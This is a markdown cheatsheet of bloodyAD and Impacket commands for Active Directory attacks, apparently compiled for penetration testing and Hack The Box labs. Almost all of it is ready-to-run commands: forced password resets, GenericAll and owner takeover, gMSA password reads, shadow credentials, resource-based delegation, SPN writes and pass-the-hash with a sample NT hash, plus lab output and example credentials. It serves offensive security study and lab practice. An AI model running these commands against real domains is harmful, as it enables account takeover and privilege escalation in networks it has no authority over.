# BloodyAD Cheatsheet

A concise cheatsheet of common **bloodyAD** commands for Active Directory tasks.
Replace the variables (`$dc`, `$domain`, `$username`, `$password`, etc.) with your target values.

---
## Retrieve user information
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```

## Add user to group (addmember allextendedright/genericall)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

## Change password
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

## Give user GenericAll rights
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll "$DN" $target_username
```

## Write owner (WriteOwner)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set owner $owner $target_username
```
```
owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam'    
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies    
  
[*] No credentials supplied, supply password  
Password:  
[*] Current owner information below  
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105  
[*] - sAMAccountName: sam  
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb  
[*] OwnerSid modified successfully!
```
## Read gMSA password (msDS-ManagedPassword)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```

## Enable a disabled account
```bash
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```

## Add TRUSTED_TO_AUTH_FOR_DELEGATION flag
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

## Modify UPN
Set new UPN:
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
```
Check UPN:
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
```

## MachineAccountQuota (enumerate)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```
Set MachineAccountQuota to 10:
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```

## Modify mail attribute
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
```

## Modify altSecurityIdentities (ESC14B)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
```

## Find writable attributes (detailed)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```

## Add shadowCredentials
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```

## Write SPN (servicePrincipalName)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```

## Find deleted objects (include deleted) 
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```

```powershell
$ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr ntsecuritydescriptor --base 'CN=Deleted Objects,DC=bloody,DC=corp' --filter "(objectClass=container)"
```
## Extended search operations (show help)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get search -h
```
Example: display tombstoned attributes with controls:
```bash
# Use the controls (-c) for additional search behavior
bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```

## Restore a deleted object
```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

## Create a new computer account
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```

## Add Resource Based Constrained Delegation (RBCD)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

---

## Notes & tips
- Pass `-k` to use Kerberos authentication.  
- You can pass a user hash instead of a password using `-p :hash`.  
- Specify format for `--password` or `-k <keyfile>` using `-f`, e.g. `-f rc4`.  
- Always verify object DNs and attributes before running modification commands.  
- Use quotes around DNs and values containing spaces or special characters.

---

## Quick cheat-sheet (most used)
```bash
# enumerate writable attributes
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail

# add genericAll
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll "$DN" $target_username

# create machine/computer
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password

# read gMSA password
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```

---

## Resources
- https://github.com/CravateRouge/bloodyAD/wiki/User-Guide  
- https://0xdf.gitlab.io/2024/03/30/htb-rebound.html  
- https://0xdf.gitlab.io/2025/04/26/htb-vintage.html  
- https://www.thehacker.recipes/  

---
get writable objects by our current user
```
bloodyAD --host <domain name> -u firstuser.last -p "" get writable --detail 
```


change password for a user ( give force change password permission)
```
bloodyAD -d ad.someorg.local --dc-ip 172.16.8.3 -u 'hporter' -p 'Gr8hambino!' set password ssmalls '!aSreksio333'
```

bloodyAD with hash NT hash authentication #PTH
```
`bloodyAD --host dc.example.local -d EXAMPLE -u someuser -p :2B576ACBE6BCFDA7294D6BD18041B8FE get membership someuser`
```
## set command (sets attributes for objects)
### add SPN To target user
`bloodyAD add <attribute>`
```
bloodyAD --host DC01.ad.someorg.local -d ad.someorg.local -u mssqladm -p :2B576ACBE6BCFDA7294D6BD18041B8FE add ServicePrincipleName 'ttimmons' 'MSSQLSvc/server.domain.local:1433'
```
